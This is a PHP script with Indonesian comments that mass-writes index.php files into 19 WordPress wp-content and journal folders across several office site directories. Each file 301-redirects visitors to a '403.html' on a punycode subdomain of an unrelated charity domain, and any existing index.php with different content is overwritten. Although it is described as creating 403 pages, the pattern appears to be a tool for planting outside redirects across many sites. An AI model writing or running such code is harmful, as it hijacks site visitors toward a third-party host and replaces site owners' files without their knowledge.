<?php
/**
 * Script untuk membuat folder dan file index.php otomatis
 * Akan membuat folder jika belum ada dan file index.php dengan redirect ke 403.html
 */

// Konten yang akan dimasukkan ke setiap file index.php
$indexContent = '<?php
header("Location: https://xn--12ca2dbc1f9gc3nd.lazismumedankota.org/403.html", true, 301);
exit();
?>';

// Array berisi semua path yang harus dibuat
$paths = [
    'C:\Offices\Oce\wp-content\assets\index.php',
    'C:\Offices\desda\wp-content\article\index.php',
    'C:\Offices\desda\wp-content\video\index.php',
    'C:\Offices\ogs\wp-content\article\index.php',
    'C:\Offices\ogs\wp-content\video\index.php',
    'C:\Offices\ogs\wp-content\assets\index.php',
    'C:\Offices\Oet\wp-content\assets\index.php',
    'C:\Offices\Oet\wp-content\video\index.php',
    'C:\Offices\Oet\wp-content\article\index.php',
    'C:\Offices\foreign\wp-content\article\index.php',
    'C:\Offices\foreign\wp-content\assets\index.php',
    'C:\Offices\oaa\wp-content\video\index.php',
    'C:\Offices\oaa\wp-content\assets\index.php',
    'C:\Offices\oaa\wp-content\article\index.php',
    'C:\Offices\oaa\wp-content\page\index.php',
    'C:\Offices\oaa\journal\index.php',
    'C:\Offices\Oesss\wp-content\video\index.php',
    'C:\Offices\ires\wp-content\video\index.php',
    'C:\Offices\ires\wp-content\assets\index.php',
];

echo "=== Script Pembuat Folder dan Index.php ===\n";
echo "Mulai memproses " . count($paths) . " path...\n\n";

$successCount = 0;
$errorCount = 0;

foreach ($paths as $filePath) {
    echo "Memproses: $filePath\n";
    
    try {
        // Ambil direktori dari path file
        $directory = dirname($filePath);
        
        // Cek apakah direktori sudah ada
        if (!is_dir($directory)) {
            echo "  → Folder belum ada, membuat folder: $directory\n";
            
            // Buat direktori secara rekursif (termasuk parent directories)
            if (!mkdir($directory, 0755, true)) {
                throw new Exception("Gagal membuat direktori: $directory");
            }
            echo "  ✓ Folder berhasil dibuat\n";
        } else {
            echo "  ✓ Folder sudah ada\n";
        }
        
        // Cek apakah file index.php sudah ada
        if (!file_exists($filePath)) {
            echo "  → File index.php belum ada, membuat file...\n";
            
            // Buat file index.php dengan konten redirect
            if (file_put_contents($filePath, $indexContent) === false) {
                throw new Exception("Gagal membuat file: $filePath");
            }
            echo "  ✓ File index.php berhasil dibuat\n";
        } else {
            echo "  → File index.php sudah ada, memeriksa konten...\n";
            
            // Baca konten file yang sudah ada
            $currentContent = file_get_contents($filePath);
            
            // Bandingkan dengan konten yang diinginkan
            if (trim($currentContent) !== trim($indexContent)) {
                echo "  → Konten tidak sesuai, memperbarui file...\n";
                
                // Update konten file
                if (file_put_contents($filePath, $indexContent) === false) {
                    throw new Exception("Gagal memperbarui file: $filePath");
                }
                echo "  ✓ Konten file berhasil diperbarui\n";
            } else {
                echo "  ✓ Konten file sudah sesuai\n";
            }
        }
        
        $successCount++;
        echo "  ✅ BERHASIL\n\n";
        
    } catch (Exception $e) {
        echo "  ❌ ERROR: " . $e->getMessage() . "\n\n";
        $errorCount++;
    }
}

// Tampilkan ringkasan hasil
echo "=== RINGKASAN HASIL ===\n";
echo "Total path diproses: " . count($paths) . "\n";
echo "Berhasil: $successCount\n";
echo "Error: $errorCount\n";

if ($errorCount === 0) {
    echo "\n🎉 Semua folder dan file berhasil dibuat!\n";
} else {
    echo "\n⚠️ Ada beberapa error, silakan periksa log di atas.\n";
}

echo "\n=== SELESAI ===\n";
?>
